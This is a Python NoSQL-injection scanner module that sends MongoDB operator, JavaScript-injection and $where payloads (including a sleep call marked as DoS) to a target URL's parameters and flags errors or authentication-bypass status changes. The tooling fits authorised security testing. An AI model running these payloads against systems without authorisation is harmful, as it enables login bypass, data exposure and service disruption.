import aiohttp
import asyncio
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads for MongoDB/NoSQL Injection
# Included: Auth Bypass ($ne, $gt), Logical Errors, and Time-based (Sleep)
NOSQL_PAYLOADS = [
    # 1. Auth Bypass / Truthy Assertions
    {"suffix": "", "value": {"$ne": None}, "desc": "MongoDB $ne: None (Auth Bypass)"},
    {"suffix": "", "value": {"$ne": ""}, "desc": "MongoDB $ne: Empty String"},
    {"suffix": "", "value": {"$gt": ""}, "desc": "MongoDB $gt: Empty String"},
    {"suffix": "", "value": {"$regex": ".*"}, "desc": "MongoDB $regex: Wildcard"},
    {"suffix": "", "value": {"$exists": True}, "desc": "MongoDB $exists: True"},
    
    # 2. String Injection (if inputs are not sanitized)
    {"suffix": "' || '1'=='1", "value": None, "desc": "Generic NoSQL 'OR 1=1"},
    {"suffix": "\"; return true; var foo=\"", "value": None, "desc": "JS Injection (Classic)"},
    {"suffix": "'; return true; var foo='", "value": None, "desc": "JS Injection (Classic Single Quote)"},

    # 3. Server-Side JS ($where) - RCE Potential
    {"suffix": "", "value": {"$where": "function(){return true;}"}, "desc": "MongoDB $where Always True"},
    {"suffix": "", "value": {"$where": "sleep(1000)"}, "desc": "MongoDB $where Sleep (DoS)"},
]

# Time-based Payloads (Sleep)
# MongoDB allows server-side JS execution in $where
TIME_PAYLOADS = [
    {"payload": "'; sleep(5000); var foo='", "delay": 5, "desc": "MongoDB Sleep (JS Injection)"},
    {"payload": "\"; sleep(5000); var foo=\"", "delay": 5, "desc": "MongoDB Sleep (JS Injection Double Quote)"},
    # Note: Modern MongoDB defaults often disable server-side JS, so this is hit-or-miss.
]

async def check_nosql_injection(session, url, log_callback=None):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params: return findings

    # [METHOD 1] Parameter Pollution / Array/Object Injection
    # Converting parameters to dictionaries (e.g. param[$ne]=val)
    # This is tricky in aiohttp usually, but we simulate by sending raw query or JSON body if applicable.
    
    for param_name in params:
        original_value = params[param_name][0]
        
        # --- Type 1: Query Operator Injection (e.g. ?user[$ne]=null) ---
        # Look for differences in response compared to original
        
        # Baseline request
        try:
             async with session.get(url, timeout=5, ssl=False) as base_resp:
                base_len = len(await base_resp.text())
        except: return []

        for item in NOSQL_PAYLOADS:
            payload_desc = item['desc']
            # Technique: Replace parameter with a dictionary/operator
            # requests/aiohttp might encode dicts as param=key&param=value, 
            # but we want param[$ne]=...
            
            # Construct malicious query string manually
            # Method A: Array/Dict Syntax parameter[$ne]=...
            if isinstance(item['value'], dict):
                op_key = list(item['value'].keys())[0] # e.g., "$ne"
                op_val = item['value'][op_key]         # e.g., None or ""
                
                # Careful with explicit None/Null in python vs URL
                if op_val is None: str_val = ""
                else: str_val = str(op_val)
                
                malicious_query = f"{param_name}[{op_key}]={str_val}"
                
                # Reconstruct full URL
                qs = parsed.query.replace(f"{param_name}={original_value}", malicious_query)
                target_url = urlunparse(parsed._replace(query=qs))
                
            else:
                # Method B: Direct String Injection
                malicious_val = original_value + item['suffix']
                new_params = params.copy()
                new_params[param_name] = [malicious_val]
                target_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))

            try:
                async with session.get(target_url, timeout=5, ssl=False) as resp:
                    text = await resp.text()
                    curr_len = len(text)
                    
                    # Heuristic: Significant change in response length or Status Code difference (e.g. 401 -> 200)
                    # For auth bypass, we look for success indicators or data leakage
                    
                    # 1. Check for specific MongoDB Errors
                    if "MongoError" in text or "bad syntax" in text or "ReferenceError" in text:
                        findings.append({
                            "type": "NoSQL Injection (Error Based)",
                            "severity": "High",
                            "detail": f"Database error triggered via {param_name}.",
                            "evidence": f"Payload: {payload_desc}\nError: {text[:100]}...",
                            "category": "Injection"
                        })
                        continue

                    # 2. Check for Auth Bypass (Length or Status change)
                    # If baseline was 401/403 and now it's 200 -> BINGO
                    if base_resp.status in [401, 403] and resp.status == 200:
                         findings.append({
                            "type": "NoSQL Injection (Auth Bypass)",
                            "severity": "Critical",
                            "detail": f"Authentication bypassed using {payload_desc}.",
                            "evidence": f"Target: {target_url}\nStatus: {base_resp.status} -> {resp.status}",
                            "category": "Injection"
                        })
            except: pass
    return findings

async def run_nosql_scan(target_url, log_callback=None, headers=None):
    findings = []
    if "?" not in target_url: return [] # Basic check for now (ignoring JSON body for this iteration)
    
    if log_callback: log_callback(f"🍃 Testing NoSQL Injection (MongoDB/Generic)...")
    
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_nosql_injection(session, target_url, log_callback)
    except Exception as e:
        if log_callback: log_callback(f"[-] NoSQL Scan Error: {e}")
        
    return findings
